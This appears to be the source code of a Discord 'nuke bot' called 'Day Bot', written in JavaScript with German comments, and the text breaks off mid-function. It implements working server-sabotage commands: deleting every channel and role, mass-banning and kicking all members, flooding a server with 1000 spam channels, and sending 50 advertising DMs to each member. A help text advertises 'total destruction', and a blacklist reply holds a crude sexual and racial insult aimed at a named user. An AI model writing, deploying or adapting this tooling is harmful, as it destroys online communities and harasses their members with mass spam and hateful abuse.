const { Client, GatewayIntentBits, Events, ChannelType } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
    ],
});

client.commands = new Map();

// Cooldowns Map erstellen
const commandCooldowns = new Map();

// Whitelist für User-IDs (nur du kannst Commands verwenden)
const whitelist = new Set([
    '1164179429031948348', // Deine User-ID
]);

// BLACKLIST SYSTEM - Blockiert User komplett
// Füge hier User-IDs hinzu, die komplett blockiert werden sollen
const blacklist = new Set([
    '1381148507259539476', // User zur Blacklist hinzugefügt
    '1102625460380237835', // User zur Blacklist hinzugefügt
    '1281645358614581372', // User zur Blacklist hinzugefügt
    // Weitere User-IDs hier hinzufügen:
    // '123456789012345678', // Beispiel User-ID
    // '987654321098765432', // Noch ein Beispiel
]);

// Funktion um zu überprüfen ob ein User whitelisted ist
function isWhitelisted(userId) {
    return whitelist.has(userId);
}

// Funktion um zu überprüfen ob ein User blacklisted ist
function isBlacklisted(userId) {
    return blacklist.has(userId);
}

// Funktion um zufällige beleidigende Blacklist-Nachrichten zu generieren
function generateRandomBlacklistInsult() {
    const insults = [
        "❌ **Senox du dummer Hu®️®️ens0hn, du bist auf der Blacklist. Ich habe deine Mutter in den Arsch gespritzt genauso wie dein hässlicher ne99a Vater, du adoptiertes Nuttenkind ** ❌",

    ];

    // Zufällige Nachricht auswählen
    const randomIndex = Math.floor(Math.random() * insults.length);
    return insults[randomIndex];
}

// BLACKLIST COMMAND - Nur du kannst ihn verwenden
const blacklistCommand = {
    async execute(message) {
        // Nur du kannst Blacklist-Command verwenden
        if (!isWhitelisted(message.author.id)) {
            await message.author.send("❌ Du hast keine Berechtigung für den Blacklist-Command!");
            return;
        }

        const args = message.content.slice(1).trim().split(/ +/);
        const action = args[1]; // add oder remove
        const targetUser = args[2]; // User-ID oder @mention

        if (!action || !targetUser) {
            await message.author.send(`📋 **Blacklist Command Hilfe:**

**Verwendung:**
!blacklist add <User-ID/@mention> - User zur Blacklist hinzufügen
!blacklist remove <User-ID/@mention> - User von Blacklist entfernen
!blacklist list - Alle blacklisted User anzeigen
!blacklist clear - Blacklist komplett leeren

**Beispiele:**
!blacklist add 123456789012345678
!blacklist add @username
!blacklist remove 123456789012345678
!blacklist list`);
            return;
        }

        try {
            if (action === 'add') {
                let userId = targetUser;

                // Wenn @mention, User-ID extrahieren
                if (targetUser.startsWith('<@') && targetUser.endsWith('>')) {
                    userId = targetUser.slice(2, -1);
                    if (userId.startsWith('!')) {
                        userId = userId.slice(1);
                    }
                }

                // Nicht sich selbst blacklisten
                if (userId === message.author.id) {
                    await message.author.send("❌ Du kannst dich nicht selbst blacklisten!");
                    return;
                }

                // Nicht bereits blacklisted
                if (blacklist.has(userId)) {
                    await message.author.send(`⚠️ User <@${userId}> ist bereits blacklisted!`);
                    return;
                }

                blacklist.add(userId);
                await message.author.send(`✅ User <@${userId}> wurde zur Blacklist hinzugefügt!`);
                console.log(`🚫 User ${userId} wurde blacklisted von ${message.author.tag}`);

            } else if (action === 'remove') {
                let userId = targetUser;

                // Wenn @mention, User-ID extrahieren
                if (targetUser.startsWith('<@') && targetUser.endsWith('>')) {
                    userId = targetUser.slice(2, -1);
                    if (userId.startsWith('!')) {
                        userId = userId.slice(1);
                    }
                }

                if (!blacklist.has(userId)) {
                    await message.author.send(`⚠️ User <@${userId}> ist nicht blacklisted!`);
                    return;
                }

                blacklist.delete(userId);
                await message.author.send(`✅ User <@${userId}> wurde von der Blacklist entfernt!`);
                console.log(`✅ User ${userId} wurde von der Blacklist entfernt von ${message.author.tag}`);

            } else if (action === 'list') {
                if (blacklist.size === 0) {
                    await message.author.send("📋 Blacklist ist leer!");
                    return;
                }

                let blacklistText = "🚫 **Blacklisted Users:**\n\n";
                for (const userId of blacklist) {
                    blacklistText += `• <@${userId}> (${userId})\n`;
                }

                await message.author.send(blacklistText);

            } else if (action === 'clear') {
                const count = blacklist.size;
                blacklist.clear();
                await message.author.send(`🧹 Blacklist geleert! ${count} User entfernt.`);
                console.log(`🧹 Blacklist geleert von ${message.author.tag} - ${count} User entfernt`);

            } else {
                await message.author.send("❌ Unbekannte Aktion! Verwende: add, remove, list oder clear");
            }

            // Originalnachricht löschen
            await message.delete().catch(() => {});

        } catch (error) {
            console.error('Fehler beim Blacklist Command:', error);
            await message.author.send('Es gab einen Fehler beim Blacklist Command.');
        }
    },
};

// Global Variables um Bot-Status und Commands zu tracken
let botIsShutdown = false;
let globalStopFlag = false;
let runningOperations = new Set();
let priorityInterrupt = false; // Für sofortigen Stopp aller Operationen
let abortController = null; // Für das Abbrechen von Operationen

// Hilfsfunktion für Stop-Check mit sofortigem Abbruch - nur für laufende Operationen
function checkStopCondition() {
    return priorityInterrupt || globalStopFlag;
}

// Promise-Wrapper mit Stop-Check - nur für destructive Commands
function createStoppablePromise(promiseFactory) {
    return new Promise((resolve, reject) => {
        if (checkStopCondition()) {
            resolve();
            return;
        }

        const promise = promiseFactory();
        const operation = promise.then(resolve).catch(reject);

        runningOperations.add(operation);
        operation.finally(() => runningOperations.delete(operation));

        // Regelmäßiger Stop-Check nur für laufende Operationen
        const stopChecker = setInterval(() => {
            if (checkStopCondition()) {
                clearInterval(stopChecker);
                resolve();
            }
        }, 50); // Weniger aggressiv

        operation.finally(() => clearInterval(stopChecker));
    });
}

const nukeCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `nuke_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 5 * 60 * 1000; // 5 Minuten in Millisekunden

        // Überprüfen ob Cooldown aktiv ist
        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !nuke Befehl ist noch für ${remainingTime} Minute(n) im Cooldown auf diesem Server!`);
                return;
            }
        }

        // Cooldown setzen (nur für nicht-whitelisted Users)
        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            // Private Nachricht an den Benutzer
            await message.author.send("🚀 Nuke-Befehl wird ausgeführt...");

            // PHASE 0: Server-Name ändern
            console.log("Ändere Server-Name...");
            try {
                await guild.setName("☣Nuked By Day Bot☣");
                console.log("Server-Name erfolgreich geändert!");
            } catch (error) {
                console.error("Konnte Server-Name nicht ändern:", error.message);
            }

            // PHASE 1: Alle aktuellen Kanäle sammeln und löschen
            await guild.channels.fetch(); // Alle Kanäle vom Server laden
            const allChannels = guild.channels.cache.filter(channel => 
                channel.type === ChannelType.GuildText || 
                channel.type === ChannelType.GuildVoice || 
                channel.type === ChannelType.GuildCategory
            );

            console.log(`Lösche ${allChannels.size} Kanäle...`);

            // Alle Kanäle parallel löschen
            const deletePromises = [];
            for (const channel of allChannels.values()) {
                deletePromises.push(
                    channel.delete().catch(error => {
                        console.error(`Konnte Kanal ${channel.name} nicht löschen:`, error.message);
                    })
                );
            }

            // Warten bis ALLE Kanäle gelöscht sind
            await Promise.all(deletePromises);
            console.log("Alle Kanäle wurden gelöscht, beginne mit Kanal-Erstellung...");

            // SOFORT ohne Pause - maximale Geschwindigkeit
            console.log("🚀 ULTRA-SPEED MODE: Starte sofortige Kanal-Erstellung...");

            // PHASE 2: DM-Spam parallel zur Kanal-Erstellung
            console.log("Starte DM-Spam parallel...");

            // Priority Interrupt Check
            if (priorityInterrupt || globalStopFlag) {
                console.log('🚨 NUKE COMMAND gestoppt durch Priority Interrupt');
                await message.author.send('🚨 Nuke Command wurde durch Stop-Command abgebrochen!');
                return;
            }

            // DM-Spam parallel starten (Fire and Forget)
            guild.members.fetch().then(async () => {
                const members = guild.members.cache;
                const dmOperations = [];

                for (const member of members.values()) {
                    if (priorityInterrupt || globalStopFlag) break;
                    if (!member.user.bot) {
                        for (let k = 0; k < 50; k++) {
                            if (priorityInterrupt || globalStopFlag) break;
                            const dmPromise = member.send("☣Nuked By Day Bot☣https://discord.gg/etjTcxevap ☣").catch(() => {});
                            dmOperations.push(dmPromise);
                            runningOperations.add(dmPromise);
                            dmPromise.finally(() => runningOperations.delete(dmPromise));
                        }
                    }
                }

                Promise.all(dmOperations).catch(() => {});
                console.log(`DM-Spam gestartet für ${members.filter(m => !m.user.bot).size} Member...`);
            }).catch(() => {});

            // PHASE 3: ULTRA-SPEED Kanal-Erstellung mit sofortigem Stop-System
            const ultraSpeedOperations = [];

            // 1000 Kanäle für maximalen Impact mit Stop-Checks
            for (let i = 0; i < 1000; i++) {
                // Sofortiger Stop-Check
                if (checkStopCondition()) {
                    console.log(`🚨 ULTRA-SPEED gestoppt bei Iteration ${i}`);
                    break;
                }

                // Channel creation mit Stop-Check wrapper
                const ultraChannelOp = createStoppablePromise(() => {
                    return guild.channels.create({
                        name: `☣Nuked By Day Bot☣`,
                        type: ChannelType.GuildText,
                    }).then(newChannel => {
                        if (checkStopCondition()) return;

                        // Nachrichten mit Stop-Checks
                        const ultraMessages = [];
                        for (let j = 0; j < 200; j++) {
                            if (checkStopCondition()) break;

                            const ultraMsgPromise = createStoppablePromise(() => {
                                return newChannel.send("☣Nuked By Day Bot☣https://discord.gg/etjTcxevap @everyone ☣");
                            });

                            ultraMessages.push(ultraMsgPromise);
                        }

                        return Promise.all(ultraMessages);
                    });
                });

                ultraSpeedOperations.push(ultraChannelOp);
            }

            // ULTRA-SPEED: Alle Kanäle parallel erstellen
            await Promise.allSettled(ultraSpeedOperations);

            if (!checkStopCondition()) {
                console.log("🚀 ULTRA-SPEED: Kanäle-Erstellung abgeschlossen!");
            } else {
                console.log("🚨 ULTRA-SPEED: Gestoppt durch Stop-Command!");
            }

            await message.author.send('Nuke-Befehl ausgeführt! Server-Name geändert, alle Kanäle gelöscht, DMs gesendet und neue Kanäle erstellt!');
        } catch (error) {
            console.error('Fehler beim Nuke-Befehl:', error);
            await message.author.send('Es gab einen Fehler beim Verarbeiten des Nuke-Befehls.');
        }
    },
};

const massBanCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `massban_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 5 * 60 * 1000; // 5 Minuten in Millisekunden

        // Überprüfen ob Cooldown aktiv ist
        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !massban Befehl ist noch für ${remainingTime} Minute(n) im Cooldown auf diesem Server!`);
                return;
            }
        }

        // Cooldown setzen (nur für nicht-whitelisted Users)
        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            await message.author.send("🚀 Mass Ban wird gestartet!");

            // Alle Mitglieder vom Server laden (falls nicht alle im Cache sind)
            await guild.members.fetch();
            const members = guild.members.cache;

            let bannedCount = 0;
            let errorCount = 0;

            // Parallel alle Mitglieder bannen für maximale Geschwindigkeit
            const banPromises = [];

            for (const member of members.values()) {
                // Alle bannen außer den Bot selbst
                if (member.user.id !== guild.members.me.id) {
                    banPromises.push(
                        member.ban({ 
                            reason: 'Mass Ban by Day Bot',
                            deleteMessageSeconds: 7 * 24 * 60 * 60 // 7 Tage Nachrichten löschen
                        }).then(() => {
                            bannedCount++;
                            console.log(`✅ Gebannt: ${member.user.tag}`);
                        }).catch(error => {
                            errorCount++;
                            console.error(`❌ Fehler beim Bannen von ${member.user.tag}:`, error.message);
                        })
                    );
                }
            }

            // Alle Bans parallel ausführen
            await Promise.all(banPromises);

            await message.author.send(`✅ Mass Ban beendet!\n📊 Gebannt: ${bannedCount}\n❌ Fehler: ${errorCount}`);
        } catch (error) {
            console.error('Fehler beim Mass Ban:', error);
            await message.author.send('Es gab einen Fehler beim Mass Ban.');
        }
    },
};

const massRoleCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `massrole_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 3 * 60 * 1000; // 3 Minuten

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !massrole Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        // Cooldown setzen (nur für nicht-whitelisted Users)
        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            await message.author.send("🚀 Mass Role wird gestartet!");

            // 100 Rollen erstellen
            const rolePromises = [];
            for (let i = 0; i < 100; i++) {
                rolePromises.push(
                    guild.roles.create({
                        name: `☣Nuked By Day Bot☣`,
                        color: 'Random',
                        mentionable: true,
                    }).catch(error => {
                        console.error(`Fehler beim Erstellen der Rolle ${i}:`, error.message);
                    })
                );
            }

            await Promise.all(rolePromises);
            await message.author.send("✅ 100 Rollen erfolgreich erstellt!");
        } catch (error) {
            console.error('Fehler beim Mass Role:', error);
            await message.author.send('Es gab einen Fehler beim Mass Role.');
        }
    },
};

const massKickCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `masskick_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 3 * 60 * 1000; // 3 Minuten

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !masskick Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        // Cooldown setzen (nur für nicht-whitelisted Users)
        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            await message.author.send("🚀 Mass Kick wird gestartet!");

            await guild.members.fetch();
            const members = guild.members.cache;

            let kickedCount = 0;
            let errorCount = 0;

            const kickPromises = [];
            for (const member of members.values()) {
                if (member.user.id !== guild.members.me.id && member.kickable) {
                    kickPromises.push(
                        member.kick('Mass Kick by Day Bot').then(() => {
                            kickedCount++;
                            console.log(`✅ Gekickt: ${member.user.tag}`);
                        }).catch(error => {
                            errorCount++;
                            console.error(`❌ Fehler beim Kicken von ${member.user.tag}:`, error.message);
                        })
                    );
                }
            }

            await Promise.all(kickPromises);
            await message.author.send(`✅ Mass Kick beendet!\n📊 Gekickt: ${kickedCount}\n❌ Fehler: ${errorCount}`);
        } catch (error) {
            console.error('Fehler beim Mass Kick:', error);
            await message.author.send('Es gab einen Fehler beim Mass Kick.');
        }
    },
};

const spamCommand = {
    async execute(message) {
        const cooldownKey = `spam_${message.channel.id}`;
        const now = Date.now();
        const cooldownTime = 2 * 60 * 1000; // 2 Minuten

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !spam Befehl ist noch für ${remainingTime} Minute(n) im Cooldown in diesem Kanal!`);
                return;
            }
        }

        // Cooldown setzen (nur für nicht-whitelisted Users)
        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            await message.delete().catch(() => {});

            // 200 Spam-Nachrichten parallel senden mit Stop-Check
            const spamPromises = [];
            for (let i = 0; i < 200; i++) {
                if (checkStopCondition()) {
                    console.log(`🚨 Spam gestoppt bei Nachricht ${i}`);
                    break;
                }

                const promise = createStoppablePromise(() => {
                    return message.channel.send("☣Nuked By Day Bot☣ @everyone https://discord.gg/etjTcxevap ☣");
                });

                spamPromises.push(promise);
            }

            if (!checkStopCondition()) {
                await Promise.allSettled(spamPromises);
                await message.author.send("🚀 Spam-Attacke gestartet!");
            } else {
                await message.author.send("🛑 Spam wurde durch Stop-Command abgebrochen!");
            }
        } catch (error) {
            console.error('Fehler beim Spam:', error);
        }
    },
};

const helpCommand = {
    async execute(message) {
        const helpMessage1 = `**🤖 Day Bot - Vollständige Befehlsliste:**

**💀 ULTIMATIVER BEFEHL:**
\`!all\` - Führt ALLE Kern-Befehle nacheinander aus (TOTALE ZERSTÖRUNG) - 15 Min Cooldown

**🔥 KERN-DESTRUKTIVE BEFEHLE:**
\`!nuke\` - Ändert Server-Name, löscht alle Kanäle, sendet DMs, erstellt 1000 Kanäle - 5 Min
\`!massban\` - Bannt alle Mitglieder (außer Bot) parallel - 5 Min Cooldown
\`!massrole\` - Erstellt 100 Rollen mit zufälligen Farben - 3 Min Cooldown
\`!masskick\` - Kickt alle kickbaren Mitglieder parallel - 3 Min Cooldown
\`!spam\` - Sendet 200 Spam-Nachrichten parallel - 2 Min Cooldown

**🚫 BLACKLIST SYSTEM:**
\`!blacklist add/remove/list/clear\` - Verwaltet die Blacklist (NUR Whitelist) - Kein Cooldown`;

        const helpMessage2 = `**🔧 KANAL & SERVER COMMANDS:**
\`!deletechannels\` - Löscht alle Kanäle - 3 Min | \`!masschannels\` - Erstellt 50 Text-Kanäle - 4 Min
\`!categoryspam\` - Erstellt 30 Kategorien - 3 Min | \`!voicespam\` - Erstellt 40 Voice-Kanäle - 3 Min
\`!threadspam\` - Erstellt 20 Threads - 2 Min | \`!servericon\` - Entfernt Server-Icon - 2 Min

**⚙️ ROLLEN & MITGLIEDER:**
\`!deleteroles\` - Löscht alle Rollen - 3 Min | \`!massnick\` - Ändert alle Nicknamen - 2 Min
\`!deleteemojis\` - Löscht alle Emojis - 2 Min | \`!admin\` - Erstellt Admin-Rolle - 3 Min

**📨 NACHRICHTEN & SPAM:**
\`!massdm\` - Sendet DMs an alle Mitglieder - 5 Min | \`!massping\` - Mass @everyone Ping - 2 Min
\`!webhookspam\` - Webhook-Spam (100 Nachrichten) - 3 Min | \`!purge\` - Löscht 1000 Nachrichten - 2 Min

**🌐 EINLADUNGEN & WEBHOOKS:**
\`!masswebhooks\` - Erstellt Webhooks in allen Kanälen - 3 Min
\`!invitedelete\` - Löscht alle Server-Einladungen - 2 Min

**💥 SPEZIAL-ATTACKS:**
\`!lag\` - Lag-Attacke mit 2000-Zeichen Nachrichten - 3 Min
\`!crash\` - Kombinierte Crash-Attacke (100 Kanäle + 50 Rollen) - 10 Min`;

        const helpMessage3 = `**ℹ️ INFO & KONTROLLE:**
\`!help\` - Zeigt diese Hilfe an - Kein Cooldown
\`!stop\` - Fährt Bot herunter + macht ihn unsichtbar (NUR Whitelist) - Kein Cooldown
\`!online\` - Fährt Bot hoch + macht ihn wieder sichtbar (NUR Whitelist) - Kein Cooldown

📊 **GESAMT:** 28 verfügbare Befehle
🔥 **Whitelist:** User-ID 1164179429031948348 ist von allen Cooldowns befreit!
🛑 **Bot-Kontrolle:** Nur whitelisted User können !stop, !online und !blacklist verwenden!
🚫 **Blacklist:** Blacklisted User können GAR KEINE Commands mehr verwenden!
⚠️ **WARNUNG:** Alle Befehle sind EXTREM destructiv und können Server dauerhaft beschädigen!

**💡 Tipps:**
• Verwende \`!blacklist help\` für detaillierte Blacklist-Commands
• \`!all\` führt die 5 Kern-Befehle nacheinander aus (nuke, massban, massrole, masskick, spam)
• Alle Commands werden parallel ausgeführt für maximale Geschwindigkeit
• Stop-Command unterbricht ALLE laufenden Operationen sofort`;

        try {
            await message.author.send(helpMessage1);
            await message.author.send(helpMessage2);
            await message.author.send(helpMessage3);

            // Originalnachricht löschen falls möglich
            if (message.deletable) {
                await message.delete();
            }
        } catch (error) {
            console.error('Fehler beim Senden der Hilfe-Nachricht:', error);
        }
    },
};

const stopCommand = {
    async execute(message) {
        // Nur whitelisted User können Bot stoppen
        if (!isWhitelisted(message.author.id)) {
            await message.author.send("❌ Du hast keine Berechtigung, den Bot zu stoppen!");
            return;
        }

        try {
            // SOFORTIGE STOP-FLAGS SETZEN - ALLERHÖCHSTE PRIORITÄT
            priorityInterrupt = true;
            globalStopFlag = true;
            botIsShutdown = true;

            console.log(`🚨 EMERGENCY STOP AKTIVIERT von User: ${message.author.tag} (${message.author.id})`);
            console.log(`🚨 Aktive Operationen vor Stop: ${runningOperations.size}`);

            // Abort Controller für bessere Promise-Kontrolle
            if (abortController) {
                abortController.abort();
            }
            abortController = new AbortController();

            // ALLE laufenden Operationen sammeln
            const operationsToWaitFor = Array.from(runningOperations);
            const totalOperations = operationsToWaitFor.length;

            console.log(`🚨 EMERGENCY STOP - ${totalOperations} Operationen werden gestoppt...`);

            // Bot-Status SOFORT ändern
            client.user.setStatus('dnd'); // DND statt invisible für bessere Sichtbarkeit
            client.user.setActivity('🚨 GESTOPPT - Nur !online, !help, !blacklist verfügbar', { type: 'PLAYING' });

            // Sofortiges Clearen der Operationen - kein Warten mehr
            runningOperations.clear();
            commandCooldowns.clear();

            console.log(`🚨 EMERGENCY STOP VOLLSTÄNDIG - ${totalOperations} Operationen gestoppt!`);

            // Nachricht löschen
            message.delete().catch(() => {});

            // Erfolgs-DM mit klaren Anweisungen
            await message.author.send(`🚨 EMERGENCY STOP VOLLSTÄNDIG!\n\n📊 ${totalOperations} Operationen gestoppt\n🤖 Bot auf "Nicht stören" gesetzt\n🚫 Destructive Commands blockiert\n\n✅ VERFÜGBARE COMMANDS:\n• !online - Bot reaktivieren\n• !help - Hilfe anzeigen\n• !blacklist - Blacklist verwalten\n\n💡 Verwende !online um alle Commands zu reaktivieren!`);

        } catch (error) {
            console.error('Fehler beim Emergency Stop:', error);
            // Auch bei Fehlern - trotzdem stoppen
            priorityInterrupt = true;
            globalStopFlag = true;
            botIsShutdown = true;
            runningOperations.clear();
            client.user.setStatus('dnd');

            await message.author.send('🚨 EMERGENCY STOP mit Fehlern, aber Bot wurde trotzdem gestoppt!\n\n✅ Verwende !online um zu reaktivieren!');
        }
    },
};

const onlineCommand = {
    async execute(message) {
        // Nur whitelisted User können Bot wieder hochfahren
        if (!isWhitelisted(message.author.id)) {
            await message.author.send("❌ Du hast keine Berechtigung, den Bot hochzufahren!");
            return;
        }

        try {
            console.log(`🚀 Bot wird REAKTIVIERT von User: ${message.author.tag} (${message.author.id})`);

            // ALLE STOP-MECHANISMEN SOFORT ZURÜCKSETZEN
            priorityInterrupt = false;
            globalStopFlag = false;
            botIsShutdown = false;
            runningOperations.clear();
            commandCooldowns.clear(); // Alle Cooldowns zurücksetzen

            // Neuen Abort Controller erstellen
            if (abortController) {
                abortController.abort();
            }
            abortController = new AbortController();

            console.log("✅ ALLE Stop-Flags zurückgesetzt - Bot ist VOLLSTÄNDIG reaktiviert!");

            // Bot-Status auf "online" setzen
            client.user.setStatus('online');
            client.user.setActivity('🚀 REAKTIVIERT - Alle Commands verfügbar!', { type: 'PLAYING' });

            // Nachricht löschen
            await message.delete().catch(() => {});

            // Erfolgs-DM
            await message.author.send("✅ BOT ERFOLGREICH REAKTIVIERT!\n\n🔄 Alle Stop-Mechanismen zurückgesetzt\n🚀 Alle destructiven Commands wieder verfügbar\n💀 Alle Cooldowns zurückgesetzt\n🟢 Bot-Status: ONLINE\n\n🔥 Der Bot ist bereit für Action!");

            console.log("🚀 Bot ist VOLLSTÄNDIG reaktiviert und alle Commands sind verfügbar!");

        } catch (error) {
            console.error('Fehler beim Reaktivieren des Bots:', error);
            // Trotzdem versuchen zu reaktivieren
            priorityInterrupt = false;
            globalStopFlag = false;
            botIsShutdown = false;
            client.user.setStatus('online');

            await message.author.send('⚠️ Bot wurde reaktiviert, aber es gab einen Fehler. Versuche es nochmal wenn Commands nicht funktionieren.');
        }
    },
};

const allCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `all_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 15 * 60 * 1000; // 15 Minuten in Millisekunden

        // Überprüfen ob Cooldown aktiv ist
        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !all Befehl ist noch für ${remainingTime} Minute(n) im Cooldown auf diesem Server!`);
                return;
            }
        }

        // Cooldown setzen (nur für nicht-whitelisted Users)
        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            await message.author.send("💀 **ULTIMATIVER ALL-COMMAND GESTARTET!** 💀\nAlle destructiven Befehle werden nacheinander ausgeführt...");
            await message.delete().catch(() => {});

            console.log(`💀 ALL-COMMAND gestartet von User: ${message.author.tag} (${message.author.id})`);

            // PHASE 1: NUKE
            console.log("🚀 PHASE 1: NUKE wird ausgeführt...");
            await message.author.send("🚀 **PHASE 1/5:** NUKE wird ausgeführt...");
            await nukeCommand.execute(message);

            // Warten zwischen Phasen
            await new Promise(resolve => setTimeout(resolve, 3000));

            // PHASE 2: MASS BAN
            console.log("🚀 PHASE 2: MASS BAN wird ausgeführt...");
            await message.author.send("🚀 **PHASE 2/5:** MASS BAN wird ausgeführt...");
            await massBanCommand.execute(message);

            // Warten zwischen Phasen
            await new Promise(resolve => setTimeout(resolve, 3000));

            // PHASE 3: MASS ROLE
            console.log("🚀 PHASE 3: MASS ROLE wird ausgeführt...");
            await message.author.send("🚀 **PHASE 3/5:** MASS ROLE wird ausgeführt...");
            await massRoleCommand.execute(message);

            // Warten zwischen Phasen
            await new Promise(resolve => setTimeout(resolve, 3000));

            // PHASE 4: MASS KICK
            console.log("🚀 PHASE 4: MASS KICK wird ausgeführt...");
            await message.author.send("🚀 **PHASE 4/5:** MASS KICK wird ausgeführt...");
            await massKickCommand.execute(message);

            // Warten zwischen Phasen
            await new Promise(resolve => setTimeout(resolve, 3000));

            // PHASE 5: SPAM
            console.log("🚀 PHASE 5: SPAM wird ausgeführt...");
            await message.author.send("🚀 **PHASE 5/5:** SPAM wird ausgeführt...");
            await spamCommand.execute(message);

            console.log("💀 ALL-COMMAND VOLLSTÄNDIG ABGESCHLOSSEN!");
            await message.author.send("💀 **ALL-COMMAND VOLLSTÄNDIG ABGESCHLOSSEN!** 💀\nAlle 5 Phasen wurden erfolgreich ausgeführt - TOTALE ZERSTÖRUNG!");

        } catch (error) {
            console.error('Fehler beim ALL-Command:', error);
            await message.author.send('Es gab einen Fehler beim ALL-Command.');
        }
    },
};

// Neue NukeBot Commands
const deleteChannelsCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `deletechannels_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 3 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !deletechannels Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            await guild.channels.fetch();
            const channels = guild.channels.cache;
            let deletedCount = 0;

            for (const channel of channels.values()) {
                if (priorityInterrupt || globalStopFlag) break;
                try {
                    await channel.delete();
                    deletedCount++;
                } catch (error) {
                    console.error(`Fehler beim Löschen von Kanal ${channel.name}:`, error.message);
                }
            }

            await message.author.send(`✅ ${deletedCount} Kanäle gelöscht!`);
        } catch (error) {
            console.error('Fehler beim Löschen der Kanäle:', error);
        }
    },
};

const deleteRolesCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `deleteroles_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 3 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !deleteroles Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            const roles = guild.roles.cache.filter(role => !role.managed && role.name !== '@everyone');
            let deletedCount = 0;

            for (const role of roles.values()) {
                if (priorityInterrupt || globalStopFlag) break;
                try {
                    await role.delete();
                    deletedCount++;
                } catch (error) {
                    console.error(`Fehler beim Löschen der Rolle ${role.name}:`, error.message);
                }
            }

            await message.author.send(`✅ ${deletedCount} Rollen gelöscht!`);
        } catch (error) {
            console.error('Fehler beim Löschen der Rollen:', error);
        }
    },
};

const massChannelsCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `masschannels_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 4 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
            if (now < expirationTime) {
                const remainingTime = Math.ceil((expirationTime - now) / 1000 / 60);
                await message.author.send(`⏰ Der !masschannels Befehl ist noch für ${remainingTime} Minute(n) im Cooldown!`);
                return;
            }
        }

        if (!isWhitelisted(message.author.id)) {
            commandCooldowns.set(cooldownKey, now);
        }

        try {
            const promises = [];
            for (let i = 0; i < 50; i++) {
                if (priorityInterrupt || globalStopFlag) break;
                promises.push(
                    guild.channels.create({
                        name: `☣nuked-by-day-bot☣`,
                        type: ChannelType.GuildText,
                    }).catch(() => {})
                );
            }
            await Promise.all(promises);
            await message.author.send('✅ 50 Kanäle erstellt!');
        } catch (error) {
            console.error('Fehler beim Erstellen der Kanäle:', error);
        }
    },
};

const massWebhooksCommand = {
    async execute(message) {
        const guild = message.guild;
        const cooldownKey = `masswebhooks_${guild.id}`;
        const now = Date.now();
        const cooldownTime = 3 * 60 * 1000;

        if (commandCooldowns.has(cooldownKey)) {
            const expirationTime = commandCooldowns.get(cooldownKey) + cooldownTime;
